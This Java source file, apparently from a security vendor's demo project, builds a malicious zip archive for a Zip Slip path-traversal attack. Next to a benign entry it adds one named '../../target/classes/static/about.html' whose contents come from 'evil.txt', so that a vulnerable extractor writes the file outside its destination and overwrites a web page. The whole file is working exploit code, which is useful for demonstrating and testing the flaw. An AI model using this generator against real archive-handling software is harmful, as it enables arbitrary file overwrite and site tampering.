package io.snyk.demo;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class ZipCreator {


    public static void main(String[] args) throws IOException {
        String content = new String(Files.readAllBytes(Paths.get("evil.txt")));


        File f = new File("jetbrains-demo.zip");
        ZipOutputStream out = new ZipOutputStream(new FileOutputStream(f));
        insertZipEntry(out, "good.txt", "This is a good textfile");
        insertZipEntry(out,
                "../../target/classes/static/about.html",
                content);
        out.close();
    }


    private static void insertZipEntry(ZipOutputStream out, String filename, String body) throws IOException{
        StringBuilder sb = new StringBuilder();
        sb.append(body);

        ZipEntry e = new ZipEntry(filename);
        out.putNextEntry(e);
        byte[] data = sb.toString().getBytes();
        out.write(data, 0, data.length);
        out.closeEntry();
    }


}
